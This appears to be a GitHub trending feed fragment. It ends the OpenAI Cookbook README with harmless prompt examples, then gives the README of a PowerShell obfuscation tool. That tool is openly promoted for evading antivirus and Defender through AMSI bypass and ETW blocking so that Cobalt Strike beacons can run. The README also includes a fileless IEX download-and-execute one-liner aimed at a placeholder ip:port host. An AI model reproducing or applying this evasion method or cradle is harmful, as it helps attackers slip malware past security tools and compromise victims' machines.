would lose and, in December 1981, resumed negotiations with the Justice Department. Reaching an agreement less than a month later, Brown agreed to divestiture—the best and only realistic alternative. AT&amp;amp;T&#39;s decision allowed it to retain its research and manufacturing arms. The decree, titled the Modification of Final Judgment, was an adjustment of the Consent Decree of 14 January 1956. Judge Harold H. Greene was given the authority over the modified decree....&#xA;&#xA;In 1982, the U.S. government announced that AT&amp;amp;T would cease to exist as a monopolistic entity. On 1 January 1984, it was split into seven smaller regional companies, Bell South, Bell Atlantic, NYNEX, American Information Technologies, Southwestern Bell, US West, and Pacific Telesis, to handle regional phone services in the U.S. AT&amp;amp;T retains control of its long distance services, but was no longer protected from competition.&#xA;&#34;&#34;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Companies: United States v. AT&amp;amp;T, AT&amp;amp;T, Justice Department, Bell South, Bell Atlantic, NYNEX, American Information Technologies, Southwestern Bell, US West, Pacific Telesis&#xA;People &amp;amp; titles: William Baxter (Assistant Attorney General), Charles L. Brown (AT&amp;amp;T chairman), Harold H. Greene (Judge)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;3. Edit text&lt;/h3&gt; &#xA;&lt;p&gt;In addition to the &lt;a href=&#34;https://beta.openai.com/docs/api-reference/completions&#34;&gt;completion API endpoint&lt;/a&gt;, OpenAI now offers an &lt;a href=&#34;https://beta.openai.com/docs/api-reference/edits&#34;&gt;edit API endpoint&lt;/a&gt; (&lt;a href=&#34;https://openai.com/blog/gpt-3-edit-insert/&#34;&gt;blog post&lt;/a&gt;). In contrast to completions, which only take a single text input, edits take two text inputs: the instruction and the text to be modified.&lt;/p&gt; &#xA;&lt;p&gt;An example edit prompt:&lt;/p&gt; &#xA;&lt;p&gt;Instruction input:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Fix the OCR errors&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Text input:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Therewassomehostilityntheenergybehindthe researchreportedinPerceptrons....Part of ourdrivecame,aswequiteplainlyacknoweldgednourbook,fromhe facthatfundingndresearchnergywerebeingdissipatedon. . .misleadingttemptsouseconnectionistmethodsnpracticalappli-cations.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;There was some hostility in the energy behind the research reported in Perceptrons....Part of our drive came, as we quite plainly acknowledged in our book, from the fact that funding and research energy were being dissipated on...misleading attempts to use connectionist methods in practical applications.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Translation&lt;/h4&gt; &#xA;&lt;p&gt;Translation is another emergent capability of large language models. In 2021, &lt;a href=&#34;https://arxiv.org/abs/2110.05448&#34;&gt;GPT-3 was used&lt;/a&gt; to set a new state-of-the-art record in unsupervised translation on the WMT14 English-French benchmark.&lt;/p&gt; &#xA;&lt;p&gt;Example translation prompt using the edits endpoint:&lt;/p&gt; &#xA;&lt;p&gt;Instruction input:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;translation into French&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Text input:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;That&#39;s life.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;C&#39;est la vie.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example translation prompt using the completions endpoint:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Translate the following text from English to French.&#xA;&#xA;English: That&#39;s life.&#xA;French:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; C&#39;est la vie.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Tips for translation:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Performance is best on the most common languages&lt;/li&gt; &#xA; &lt;li&gt;We&#39;ve seen better performance when the instruction is given in the final language (so if translating into French, give the instruction &lt;code&gt;Traduire le texte de l&#39;anglais au français.&lt;/code&gt; rather than &lt;code&gt;Translate the following text from English to French.&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Backtranslation (as described &lt;a href=&#34;https://arxiv.org/abs/2110.05448&#34;&gt;here&lt;/a&gt;) can also increase performance&lt;/li&gt; &#xA; &lt;li&gt;Text with colons and heavy punctuation can trip up the instruction-following models, especially if the instruction is using colons (e.g., &lt;code&gt;English: {english text} French:&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;The edits endpoint has been seen to sometimes repeat the text input alongside the translation&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;When it comes to translation, large language models particularly shine at combining other instructions alongside translation. For example, you can ask GPT-3 to translate Slovenian to English but keep all LaTeX typesetting commands unchanged. The following notebook details how we translated a Slovenian math book into English:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/book_translation/translate_latex_book.ipynb&#34;&gt;Translation of a Slovenian math book into English&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;4. Compare text&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://beta.openai.com/docs/guides/embeddings&#34;&gt;OpenAI API embeddings endpoint&lt;/a&gt; can be used to measure similarity between pieces of text (&lt;a href=&#34;https://openai.com/blog/introducing-text-and-code-embeddings/&#34;&gt;blog post&lt;/a&gt;). By leveraging GPT-3&#39;s understanding of text, these embeddings &lt;a href=&#34;https://arxiv.org/abs/2201.10005&#34;&gt;achieved state-of-the-art results&lt;/a&gt; on benchmarks in both unsupervised learning and transfer learning settings.&lt;/p&gt; &#xA;&lt;p&gt;Embeddings can be used for semantic search, recommendations, cluster analysis, near-duplicate detection, and more.&lt;/p&gt; &#xA;&lt;h4&gt;Semantic search&lt;/h4&gt; &#xA;&lt;p&gt;Embeddings can be used for search either by themselves or as a feature in a larger system.&lt;/p&gt; &#xA;&lt;p&gt;The simplest way to use embeddings for search is as follows:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Before the search (precompute): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Split your text corpus into chunks smaller than the token limit (e.g., &amp;lt;8,000 tokens)&lt;/li&gt; &#xA;   &lt;li&gt;Embed each chunk&lt;/li&gt; &#xA;   &lt;li&gt;Store those embeddings in your own database or in a vector search provider like &lt;a href=&#34;https://www.pinecone.io&#34;&gt;Pinecone&lt;/a&gt; or &lt;a href=&#34;https://weaviate.io&#34;&gt;Weaviate&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;At the time of the search (live compute): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Embed the search query&lt;/li&gt; &#xA;   &lt;li&gt;Find the closest embeddings in your database&lt;/li&gt; &#xA;   &lt;li&gt;Return the top results, ranked by cosine similarity&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;An example of how to use embeddings for search is shown in &lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Semantic_text_search_using_embeddings.ipynb&#34;&gt;Semantic_text_search_using_embeddings.ipynb&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;In more advanced search systems, the the cosine similarity of embeddings can be used as one feature among many in ranking search results.&lt;/p&gt; &#xA;&lt;h4&gt;Recommendations&lt;/h4&gt; &#xA;&lt;p&gt;Recommendations are quite similar to search, except that instead of a free-form text query, the inputs are items in a set.&lt;/p&gt; &#xA;&lt;p&gt;An example of how to use embeddings for recommendations is shown in &lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Recommendation_using_embeddings.ipynb&#34;&gt;Recommendation_using_embeddings.ipynb&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Similar to search, these cosine similarity scores can either be used on their own to rank items or as features in larger ranking algorithms.&lt;/p&gt; &#xA;&lt;h4&gt;Customizing Embeddings&lt;/h4&gt; &#xA;&lt;p&gt;Although OpenAI&#39;s embedding model weights cannot be fine-tuned, you can still use training data to customize embeddings to your application.&lt;/p&gt; &#xA;&lt;p&gt;In the following notebook, we provide an example method for customizing your embeddings using training data. The idea of the method is to train a custom matrix to multiply embedding vectors by in order to get new customized embeddings. With good training data, this custom matrix will highlight the features relevant to your training labels and suppress the rest. You can equivalently consider the matrix multiplication as (a) a modification of the embeddings or (b) a modification of the distance function used to measure the distances between embeddings.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Customizing_embeddings.ipynb&#34;&gt;Customizing_embeddings.ipynb&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Code Capabilities&lt;/h2&gt; &#xA;&lt;p&gt;Large language models aren&#39;t only great at text - they can be great at code too. OpenAI&#39;s specialized code model is called &lt;a href=&#34;https://openai.com/blog/openai-codex/&#34;&gt;Codex&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Codex powers &lt;a href=&#34;https://openai.com/blog/codex-apps/&#34;&gt;more than 70 products&lt;/a&gt;, including:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://copilot.github.com/&#34;&gt;GitHub Copilot&lt;/a&gt; (autocompletes code in VS Code and other IDEs)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pygma.app/&#34;&gt;Pygma&lt;/a&gt; (turns Figma designs into code)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://replit.com/&#34;&gt;Replit&lt;/a&gt; (has an &#39;Explain code&#39; button and other features)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.warp.dev/&#34;&gt;Warp&lt;/a&gt; (a smart terminal with AI command search)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://machinet.net/&#34;&gt;Machinet&lt;/a&gt; (writes Java unit test templates)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Note that unlike instruction-following text models (e.g., &lt;code&gt;text-davinci-003&lt;/code&gt;), Codex is &lt;em&gt;not&lt;/em&gt; trained to follow instructions. As a result, designing good prompts can take more care.&lt;/p&gt; &#xA;&lt;h3&gt;1. Write code&lt;/h3&gt; &#xA;&lt;p&gt;An example prompt for writing code with &lt;code&gt;code-davinci-002&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;SQL tables (and columns):&#xA;* Customers(customer_id, signup_date)&#xA;* Streaming(customer_id, video_id, watch_date, watch_minutes)&#xA;&#xA;A well-written SQL query that lists customers who signed up during March 2020 and watched more than 50 hours of video in their first 30 days:&#xA;```&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;SELECT c.customer_id&#xA;FROM Customers c&#xA;JOIN Streaming s&#xA;ON c.customer_id = s.customer_id&#xA;WHERE c.signup_date BETWEEN &#39;2020-03-01&#39; AND &#39;2020-03-31&#39;&#xA;AND s.watch_date BETWEEN c.signup_date AND DATE_ADD(c.signup_date, INTERVAL 30 DAY)&#xA;GROUP BY c.customer_id&#xA;HAVING SUM(s.watch_minutes) &amp;gt; 50 * 60&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;code-davinci-002&lt;/code&gt; is able to make inferences from variable names; for example, it infers that &lt;code&gt;watch_minutes&lt;/code&gt; has units of minutes and therefore needs to be converted by a factor of 60 before being compared with 50 hours.&lt;/p&gt; &#xA;&lt;h3&gt;2. Explain code&lt;/h3&gt; &#xA;&lt;p&gt;Code explanation can be applied to many use cases:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Generating in-code documentation (e.g., Python docstrings, git commit messages)&lt;/li&gt; &#xA; &lt;li&gt;Generating out-of-code documentation (e.g., man pages)&lt;/li&gt; &#xA; &lt;li&gt;In an interactive code exploration tool&lt;/li&gt; &#xA; &lt;li&gt;Communicating program results back to users via a natural language interface&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;An example prompt for explaining code with &lt;code&gt;code-davinci-002&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;A SQL query:&#xA;```&#xA;SELECT c.customer_id&#xA;FROM Customers c&#xA;JOIN Streaming s&#xA;ON c.customer_id = s.customer_id&#xA;WHERE c.signup_date BETWEEN &#39;2020-03-01&#39; AND &#39;2020-03-31&#39;&#xA;AND s.watch_date BETWEEN c.signup_date AND DATE_ADD(c.signup_date, INTERVAL 30 DAY)&#xA;GROUP BY c.customer_id&#xA;HAVING SUM(s.watch_minutes) &amp;gt; 50 * 60&#xA;```&#xA;&#xA;Questions:&#xA;1. What does the SQL query do?&#xA;2. Why might someone be interested in this time period?&#xA;3. Why might a company be interested in this SQL query?&#xA;&#xA;Answers:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;1. The SQL query finds all customers who signed up in March 2020 and watched more than 50 hours of content in the first 30 days after signing up.&#xA;2. The time period is interesting because it is the first month of the COVID-19 pandemic.&#xA;3. A company might be interested in this SQL query because it can help them understand how the pandemic has affected their business.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;3. Edit code&lt;/h3&gt; &#xA;&lt;p&gt;OpenAI&#39;s edit endpoint is particularly useful for editing code.&lt;/p&gt; &#xA;&lt;p&gt;Example text input to &lt;code&gt;code-davinci-edit-001&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def tribonacci(n):&#xA;    if n == 0:&#xA;        return 0&#xA;    elif n == 1:&#xA;        return 1&#xA;    elif n == 2:&#xA;        return 1&#xA;    elif n == 3:&#xA;        return 2&#xA;    else:&#xA;        return tribonacci(n-1) + tribonacci(n-2) + tribonacci(n-3)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example instruction inputs:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Add a docstring&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Add typing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Improve the runtime&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Add a test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Translate to JavaScript (or Rust or Lisp or any language you like)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example output after improving the runtime and translating to JavaScript:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-JavaScript&#34;&gt;function tribonacci(n) {&#xA;  let a = 0;&#xA;  let b = 1;&#xA;  let c = 1;&#xA;  for (let i = 0; i &amp;lt; n; i++) {&#xA;    [a, b, c] = [b, c, a + b + c];&#xA;  }&#xA;  return a;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;As you can see, &lt;code&gt;code-davinci-edit-001&lt;/code&gt; was able to successfully reduce the function&#39;s runtime from exponential down to linear, as well as convert from Python to JavaScript.&lt;/p&gt; &#xA;&lt;h3&gt;4. Compare code&lt;/h3&gt; &#xA;&lt;p&gt;The OpenAI API also features code search embeddings, which can measure the relevance of a section of code to a text query, or the similarity between two sections of code.&lt;/p&gt; &#xA;&lt;p&gt;OpenAI code search embeddings significantly improved the state-of-the-art on the &lt;a href=&#34;https://github.com/github/CodeSearchNet&#34;&gt;CodeSearchNet&lt;/a&gt; evaluation suite, scoring 93.5% versus the previous record of 77.4%.&lt;/p&gt; &#xA;&lt;p&gt;Read more about OpenAI&#39;s code embeddings in the &lt;a href=&#34;https://openai.com/blog/introducing-text-and-code-embeddings/&#34;&gt;blog post announcement&lt;/a&gt; or &lt;a href=&#34;https://beta.openai.com/docs/guides/embeddings&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Code embeddings can be useful for use cases such as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Code search&lt;/li&gt; &#xA; &lt;li&gt;Codebase clustering &amp;amp; analysis&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;An example of code search is shown in &lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Code_search.ipynb&#34;&gt;Code_search.ipynb&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;We haven&#39;t written an example of code clustering, but the idea is the same as the text clustering in &lt;a href=&#34;https://raw.githubusercontent.com/openai/openai-cookbook/main/examples/Clustering.ipynb&#34;&gt;Clustering.ipynb&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>H4de5-7/powershell-obfuscation</title>
    <updated>2022-12-22T01:30:12Z</updated>
    <id>tag:github.com,2022-12-22:/H4de5-7/powershell-obfuscation</id>
    <link href="https://github.com/H4de5-7/powershell-obfuscation" rel="alternate"></link>
    <summary type="html">&lt;p&gt;powershell免杀混淆器，简单有效，VT全过。A simple and effective powershell obfuscaiton tool bypass Anti-Virus&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;powershell-obfuscation&lt;/h1&gt; &#xA;&lt;p&gt;简单有效的powershell免杀混淆的小工具，VT全绿，可过Defender、360等，可执行上线cobaltstrike等操作。&lt;/p&gt; &#xA;&lt;p&gt;AMSI混淆绕过+ETW混淆block+powershell命令混淆绕过。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;请勿使用于任何非法用途，由此产生的后果自行承担。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;上述测试环境均为实体机。&lt;/p&gt; &#xA;&lt;p&gt;A simple and effective powershell obfuscaiton tool bypass Anti-Virus, VT.&lt;/p&gt; &#xA;&lt;p&gt;AMSI-bypass obfuscation + ETW-block obfuscation + powershell command obfuscation.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please do not use it for any illegal purpose, and the consequences arising therefrom shall be borne by yourself.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;思路&lt;/h2&gt; &#xA;&lt;p&gt;这段时间看了看powershell反混淆相关的内容与论文，目前反混淆效果最好的应该是2022年qax的《Invoke-Deobfuscation: AST-Based and Semantics-Preserving Deobfuscation for PowerShell Scripts》，该论文延续了19年CCS浙大的思路并进行了改进，使用了变量追踪并在AST层面上进行了invoke解混淆，比defender和VT的效果好不少。&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;不过论文中也提到了当前powershell反混淆研究的难点，一个是自定义function加密解不开，一个是很难去追踪循环中的变量。&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;由于部分的反混淆工具会在AST层面上进行反混淆的工作，因此powershell自带的大部分加密解密/编码解码的函数是形同虚设的，如[System.Convert]::FromBase64String等。应该尽可能去使用自定义的加密解密的function。&lt;/p&gt; &#xA;&lt;p&gt;这里针对这两个学术界研究的难点，写了一个简单的powershell混淆器，事实证明效果确实也不错。具体思路如下：&lt;/p&gt; &#xA;&lt;p&gt;1、自定义加密解密function，function中进行字符串的逆序（逆序没有用powershell自带的函数，防止AST层面上解混淆）与字符的+-运算（不使用异或运算的原因是defender对-bxor监控很严格）。&lt;/p&gt; &#xA;&lt;p&gt;2、对上述function进行几次循环的运算。&lt;/p&gt; &#xA;&lt;p&gt;3、为了能让字符有效地输出，最后用base64编码了一下（即便在AST层面上解开也无所谓，因为解开了的内容仍是混淆之后的）。&lt;/p&gt; &#xA;&lt;p&gt;同时对AMSI绕过与ETW block与powershell命令进行了混淆。&lt;/p&gt; &#xA;&lt;p&gt;这里仅仅实现了一个简单的混淆器demo，可以自由发挥，后续要是有时间的话我会继续完善。&lt;/p&gt; &#xA;&lt;p&gt;实验了一下，用qax的反混淆工具与Unit42团队的反混淆工具都是解不开的。&lt;/p&gt; &#xA;&lt;p&gt;The tool with the best anti-obfuscation effect at present should be《Invoke-Deobfuscation: AST-Based and Semantics-Preserving Deobfuscation for PowerShell Scripts》. This paper uses variable tracking and invoke de-obfuscation at the AST level, the effect is much better than that of defender and VT.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;However, this paper also mentioned the difficulties of the current powershell anti-obfuscation research. One is that the custom function encryption cannot be de-obfuscated, and the other is that it is difficult to track the variables in the loop.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Since some de-obfuscation tools de-obfuscates at the AST level, most of the encryption/encoding functions that come with powershell are useless, such as [System.Convert]::FromBase64String and so on. You should use custom encryption and decryption functions as much as possible.&lt;/p&gt; &#xA;&lt;p&gt;Aiming at the difficulties of these the academic research, I wrote a simple powershell obfuscator, and it turns out that the result is really good. The specific ideas are as follows:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Customize the encryption and decryption function. In the function, reverse the string (reversing string does not use the function that comes with powershell to prevent de-confusing at the AST level) and the +- operation of characters (the reason why the XOR operation is not used here is that the defender monitors -bxor strictly).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Perform several loop operations on the encryption and decryption function.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In order to allow the characters to be effectively output, it is finally encoded with base64 (even if it is decoded at the AST level, it does not matter, because the decoded content is still obfuscated).&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;This tool implements AMSI-bypass obfuscation, ETW-block obfuscation and powershell command obfuscation.&lt;/p&gt; &#xA;&lt;h2&gt;使用的方法&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;./powershell-obfuscation.ps1 -c &#34;whoami&#34;&lt;/code&gt; 来混淆命令 obfuscates command&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;./powershell-obfuscation.ps1 -f &#34;filename&#34;&lt;/code&gt; 来混淆指定的文件（绝对路径） obfuscates specific file (absolute path)&lt;/p&gt; &#xA;&lt;p&gt;结果会输出在当前目录下的bypass.ps1中&lt;/p&gt; &#xA;&lt;p&gt;The result can be found in bypass.ps1.&lt;/p&gt; &#xA;&lt;p&gt;以cs的beacon.ps1为例&lt;/p&gt; &#xA;&lt;p&gt;Take beacon.ps1 as an example&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;上线cs可以混淆beacon.ps1然后落地来执行，也可以直接混淆cs的iex下载一句话IEX ((new-object net.webclient).downloadstring(&#39;&lt;a href=&#34;http://ip:port/a&#39;)%E6%9D%A5%E4%B8%8D%E8%90%BD%E5%9C%B0%E6%89%A7%E8%A1%8C%E3%80%82&#34;&gt;http://ip:port/a&#39;)来不落地执行。&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;混淆前VT如下：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/48757788/208227398-4b3abb77-bef6-4891-9798-31255c9557f8.png&#34; alt=&#34;1671255963304&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;混淆后VT如下：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/48757788/208227402-42d2cfce-9b19-4c69-b4b9-da2a4fc609f7.png&#34; alt=&#34;1671255985878&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;上线：&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/H4de5-7/powershell-obfuscation/raw/main/CS.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>